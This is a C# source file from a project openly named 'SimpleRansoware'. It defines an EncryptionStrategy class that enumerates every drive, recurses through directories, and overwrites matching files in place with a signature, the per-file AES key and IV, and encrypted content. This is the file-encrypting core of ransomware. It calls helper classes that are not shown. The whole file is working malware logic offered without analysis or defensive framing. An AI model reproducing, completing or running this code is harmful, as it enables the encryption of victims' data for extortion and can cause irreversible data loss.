using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleRansoware
{
    /// <summary>
    /// Basic Encryption Strategy
    /// </summary>
    public sealed class EncryptionStrategy
    {

        /// <summary>
        /// Main Encryption Method
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public void EncryptDisk()
        {
#if DEBUG
            Trace.WriteLine("[*] EncryptDisk");
#endif
            // Enumerate All Device Disks
            DriveInfo[] drives = DriveInfo.GetDrives();

#if DEBUG
            Trace.WriteLine("[+] Drives Enumerated Successfully. " + drives.Length + " Drives Found");
#endif

            // Iterate Drivers
            foreach (DriveInfo drive in drives)
            {
                EncryptDrive(drive);
            }

        }


        /// <summary>
        /// Full Encrypt Drive
        /// </summary>
        /// <param name="drive"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        private void EncryptDrive(DriveInfo drive)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] EncryptDrive (" + drive.Name + ")");
            Trace.Indent();
#endif

            // Check Drive State
            if (drive.IsReady)
            {
                // Get All Folders
                DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();

                // Encrypt All Directories
                foreach (DirectoryInfo di in directories)
                {
                    EncryptDirectory(di);
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Drive is not Ready");
#endif
            }


#if DEBUG
            Trace.Unindent();
#endif
        }

        /// <summary>
        /// Encrypt a Directory
        /// </summary>
        /// <param name="di"></param>
        private void EncryptDirectory(DirectoryInfo di)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] EncryptDirectory (" + di.Name + ")");
#endif

            // Check Directory Filter
            if (! Common.DirectoryInFilter(di.FullName))
            {
#if DEBUG
                Trace.Indent();
                Trace.WriteLine("[+] Directory Not in Filter");
                Trace.Unindent();
#endif
                return;
            }


            // Recursive Operation
            try
            {
                DirectoryInfo[] subDrives = di.GetDirectories();

                if (subDrives != null)
                {
                    foreach (DirectoryInfo subDirectory in subDrives)
                    {
                        EncryptDirectory(subDirectory);
                    }
                }

                // Encrypt All Drive Files
                FileInfo[] files = di.GetFiles();

                foreach (FileInfo file in files)
                {
                    EncryptFile(file);
                }
            }
            catch (Exception e)
            {
#if DEBUG
                Trace.WriteLine("");
                Trace.WriteLine("[!] Error While Read Directory");
                Trace.WriteLine(e.ToString());
#endif
            }
        }


        /// <summary>
        /// Encrypt a Single File
        /// </summary>
        /// <param name="file"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        private void EncryptFile(FileInfo file)
        {
            // Simple Thread Wait
            Thread.Sleep(10);

#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] EncryptFile (" + file.Name + ")");
            Trace.Indent();
#endif

            // Check File in Filter
            if (Common.FileInFilter(file.Extension))
            {
                // File Signature Decision Gate
                if (!Common.CheckSignature(file))
                {
                    // Encrypt
#if DEBUG
                    Trace.WriteLine("[+] File to Encrypt");
#endif
                    // Try to Rotate Key
                    CriptoKeyManager.RotateAesKey();

                    // Read File Data
                    Byte[] fileData = null;
                    FileManager.ReadFile(file, ref fileData);

                    // Encrypt File
                    using (FileStream fs = File.OpenWrite(file.FullName))
                    {
                        fs.Position = 0;

                        // Write Control Structure
                        fs.Write(ConfigurationManager.FILE_SIGNATURE, 0, ConfigurationManager.FILE_SIGNATURE_SIZE);
                        fs.Write(CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY, 0, CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY.Length);
                        fs.Write(CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV, 0, CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV.Length);

                        fs.Flush();

                        // Write Encrypted Data
                        CriptoFileManager.Encrypt(fs, ref fileData);
                    }
                }
                else
                {
#if DEBUG
                    Trace.WriteLine("[+] File Alread Encrypted");
#endif
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] File Filter not Allowed");
#endif
            }


#if DEBUG
            Trace.Unindent();
#endif
        }

    }
}
